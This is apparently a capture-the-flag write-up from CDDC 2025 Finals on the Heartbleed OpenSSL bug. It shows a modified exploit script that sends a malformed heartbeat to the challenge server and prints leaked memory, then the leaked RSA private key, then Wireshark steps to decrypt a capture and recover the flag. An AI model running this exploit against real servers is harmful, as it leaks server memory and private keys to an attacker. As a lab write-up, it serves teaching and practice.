---
author: "Shun Ren"
title: "[CDDC 2025 Finals] Heartbleed"
date: 2025-06-16T00:00:00+08:00
description: "Heartbleed writeup from CDDC Finals"
tags: ["writeups", "ctf", "cve"]
ShowBreadcrumbs: False
HideSummary: True
hiddenInHomeList: True
---



In this challenge, we are given 2 things: 
1. A pcap file, that involves a conversation encrypted over HTTPS
2. Links to some websites (`https://chal2.h4c.cddc2025.xyz`)

Judging from the name itself, this challenge is about heartbleed, a bug in OpenSSL that allowed for the leaking of memory contents, through 1. Supplying a small payload data 2. Specifying a way larger length for that payload

Visiting any of the websites in the links, will bring us to a page that displays a warning about how the server is vulnerable to heartbleed, as such we should try sending a payload to them and see what we get (I don't have any screenshots of it T_T)

Luckily for us, since this is an old CVE, there are many scripts available online which can perform the exploit, such as [this](https://github.com/jknudsen-synopsys/heartbleed-box/blob/main/exploit.py)

Everything is the same, but instead of searching for a username, we modify it to print out the response bytes as a string:
```py
...
    print(r[startIndex:endIndex].decode())
    
    return endIndex

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

server_address = ('chal2.h4c.cddc2025.xyz', 443)
print('[Connecting to {} port {}]'.format(*server_address))
s.connect(server_address)

try:
    s.sendall(tls_hello)     # Send Client Hello
    s.recv(8 * 1024)         # Receive Server Hello, Certificate, Server Hello Done
    s.sendall(tls_heartbeat) # Send badly formed Heartbeat Request
    r = s.recv(64*1024)      # Receive server memory!
    print(r.decode('utf-8', errors='ignore'))

    index = 0
    while index < len(r) and index != -1:
        index = findCredentials(r[index:], "private")
    

finally:
    print('[Closing socket]')
    s.close()
```

Next, we put the result through python to get rid of the newlines:
```py
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAyJM+wrhOqjeV5ko8iMxLARk5dfoLb0f5lQDEv45n66ae6a/X
8ZaJztr7UFmyEJ2tIacW4GnY41eHEWagClyIOD
Rmn4feibrLz4FwXwWx2kGK3KxS
dlNFA57uL4lrXbczR7mgozdC2kF3fO07pGM5//TFPfCND3YtR3TfzM+tawN3+lba
8/PDnWEO8IzUw7zr1KKHnFhZJ6ZCOImes1K0anD5DOo
dJpTgdo5+7MJakMpe6T88
OkKBWTEuzrNXonN5f4uL5he98TT896ykSdiu857p+rIcK46zlIIbz2ZPUm0TLPJq
Dv41LIi9tTAKmOwqc/QZV8UWMjw++zV3/ZgrFwIDAQABAoIB
AQChlBTcElO0xkCo
myc24LSPdv2WL8+kXuwNf+f/lL3c1YZxJOomQapUjI4mBYvv3MXLNWq1cC97vVge
yXilwDMwa+48F91LQMLNMC4RLmo/M8ukx+FKVvxi1VZ1zxNCFMJnx
n9E3NCrOFAE
wKvqWtEvg8SdiDpquT3ysZFU0fyXFm7v8SN3M2l51SbZTO87ahQXjjVzjHDlGZsF
vU+H2s0xkLjiKwMGR2L89w3MrW5N4rlgN6u5/ya7xc8hMMPgwBLwrQwnaM
GN7QAu
umVzf3L37hhvrUPnq9PEoWFC9jdkTVuqG3PFmObgoy1mfpYzczmXNFphpIoD3ROn
G8o3dsA5AoGBAPX2U767sZ+Sm8nakZo3+dicPalH2rwcXulZN2vrUyT5IK2cafR
M
Zg2vReA93tSpmNI453CEPuDH0mbuW7RdpO4mw9QCg43wEzWtTJOfmpp8RD5RQ33G
bF/5zys2lHvFJeD5gOOzBW2m7F8AJiXeEoWR5WQ05hhUHRKpD+7DHOZFAoGBANDC
vX
o4QQ0k6H+9yPPHXR0nF25JYxok6aLIex9ErrL4FKy76rCgS1G90rvEt7QHkd9g
z3LU2qKzpk7Z/t4pW2/OVoe92YNXBMMKENUdmq2PYp784QgWec8hARr3IlYmm5eV
0/WAbYA
4bg64eMVaKQBvEeK4ndVN5jDQoRIuSB+rAoGBALxTs6OjC0nnc6mG1V2D
5qXYW8412mGWR4XcbfcP5EW3CzJjRS1tIebwgUxFk0y53u137J3WZF6wIYX2k/jy
ispenCrFEf2o
CM1ct/mAh1wqMgaVKlwvheOm3t1zmRV7ypkL8YhnFozy9qF2976e
3weuwjmL13JhVTFoiW6DrqkRAoGBAICG9RszWTGbgJ1tHjSgkL5rG+zlt+MXyNRU
9CC7K4e6Xxg+Fe8qs
VShNwYtxiBL7M6HjxEW5Yj4bDLt2hGzir0aX4HxK+LGB4OB
Rf2/3URwG/rgnDdbhyE0I7cTYouB95drQnVK3Z/sni3n+0seCFJhD7TzjxENheSV
/iTwY61DAoGAVfBF+/rc6o
0DNX27ENOQ6vVfLtHzvn1mMqgvL6t56h2idzTC/BuR
EJtSFvU/tmb+sEuv5GHxApHH8DWMuLBtupmmb4Rp60AFbgVQw2a/z3Irmb9rpaN1
Wze0YBlExVziaVLn7HIwIQZdke0
cct5Y5DzS+q0w8Ei7SfWP0P+k9AM=
-----END RSA PRIVATE KEY----
```
Save this key into a file, with a `.key` extension, e.g. `server.key`, this key will be used to decrypt the TLS sections of the pcap file we are given

Next, add the key to wireshark by navigating to `Edit -> Preferences -> Protocols -> TLS -> RSA keys list -> Edit`, you can just add it as a key file, and leave the other fields blank:
![alt text](/images/cddc-25-heartbleed/image.png)

After saving the settings, we can now see that the sections have been changed to `HTTP`, and there was a request for `flag.html`, we can export this file using `Export Objects`:
![alt text](/images/cddc-25-heartbleed/image-2.png)
